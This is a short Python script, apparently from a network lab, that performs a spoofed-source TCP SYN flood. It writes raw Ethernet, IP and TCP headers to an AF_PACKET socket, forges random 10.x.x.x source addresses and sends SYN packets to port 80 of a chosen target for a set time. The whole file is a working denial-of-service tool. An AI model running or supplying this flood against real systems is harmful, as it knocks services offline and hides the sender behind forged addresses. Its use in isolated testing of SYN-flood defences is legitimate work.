"""Spoofed-source TCP SYN flood over a raw AF_PACKET socket (run inside the attacker namespace)."""
import os, random, socket, struct, sys, time
iface, dst_mac, dst_ip, seconds = sys.argv[1], sys.argv[2], sys.argv[3], float(sys.argv[4])
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
src_mac = open(f'/sys/class/net/{iface}/address').read().strip()
eth = bytes.fromhex(dst_mac.replace(':', '')) + bytes.fromhex(src_mac.replace(':', '')) + b'\x08\x00'
dst = socket.inet_aton(dst_ip)
rng = random.Random(7)
sent, end = 0, time.time() + seconds
while time.time() < end:
    for _ in range(1000):
        ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, 0, 0, 64, 6, 0, struct.pack("!I", (10 << 24) | rng.getrandbits(24)), dst)
        tcp = struct.pack('!HHIIBBHHH', rng.randrange(1024, 65535), 80, 0, 0, 0x50, 0x02, 1024, 0, 0)
        s.send(eth + ip + tcp)
        sent += 1
print(f'sent {sent} packets in {seconds:.0f} s ({sent / seconds:,.0f}/s)', flush=True)
